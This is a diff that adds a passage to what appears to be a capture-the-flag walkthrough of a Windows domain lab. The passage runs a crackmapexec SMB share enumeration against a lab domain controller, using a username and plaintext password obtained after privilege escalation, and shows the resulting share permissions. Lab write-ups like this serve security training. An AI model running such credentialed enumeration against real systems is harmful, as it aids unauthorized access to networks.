@@ -147,3 +147,23 @@ PUPPY\ant.edwards
 PUPPY\adam.silver
 PUPPY\jamie.williams
 ```
+
+Interestingly, elevating our privileges in this way gives us read access to the DEV share from earlier:
+
+
+```
+crackmapexec smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' --shares
+```
+
+#### Output:
+
+```
+SMB         10.129.232.75   445    DC               Share           Permissions     Remark
+SMB         10.129.232.75   445    DC               -----           -----------     ------
+SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.232.75   445    DC               C$                              Default share
+SMB         10.129.232.75   445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
+SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share
+```
